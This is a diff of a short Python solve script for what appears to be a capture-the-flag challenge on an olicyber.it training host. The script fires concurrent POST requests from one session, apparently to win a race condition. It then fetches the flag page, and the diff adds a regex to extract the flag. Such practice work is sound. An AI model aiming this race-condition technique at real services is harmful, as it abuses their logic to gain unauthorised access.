@@ -1,5 +1,8 @@
-import requests
+import requests, re
 from multiprocessing.dummy import Pool
+
+REGEX = r"flag{.*?}"
+
 pool = Pool(3)
 site = "http://invalsi.challs.olicyber.it/"
 s = requests.Session()
@@ -11,4 +14,5 @@ for x in range(3):
     futures.append(pool.apply_async(s.post, [site], {"json":da}))
 for future in futures:
     future.get()
-print(s.get(site+"flag").text)
+r = s.get(site + "flag").text
+print(re.findall(REGEX, r)[0])
